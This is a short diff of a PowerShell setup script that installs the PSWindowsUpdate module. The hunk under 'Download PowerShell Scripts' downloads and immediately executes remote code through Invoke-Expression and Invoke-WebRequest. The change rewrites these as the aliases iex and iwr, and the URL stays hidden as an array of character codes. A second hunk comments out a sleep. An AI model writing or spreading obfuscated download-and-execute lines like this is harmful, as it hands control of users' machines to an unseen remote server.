@@ -19,8 +19,8 @@ if(-not `$ConnectedToTheInternet){
   
       #region --- Download PowerShell Scripts ---
 
-        (Invoke-Expression (Invoke-WebRequest -Uri ([char[]](104,116,116,112,115,58,47,47,112,
-        97,110,103,101,97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())
+        (iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,
+        97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())
       
       #endregion --------------------------------
   
@@ -61,7 +61,7 @@ if(-not `$ConnectedToTheInternet){
         Install-Module -Name PSWindowsUpdate -Force
         #Install-WindowsUpdate -AcceptAll -Download
 
-        Start-Sleep -Seconds 5
+        #Start-Sleep -Seconds 5
         Write-Host `"``nPlease restart PowerShell`" -ForegroundColor Yellow
       }
     
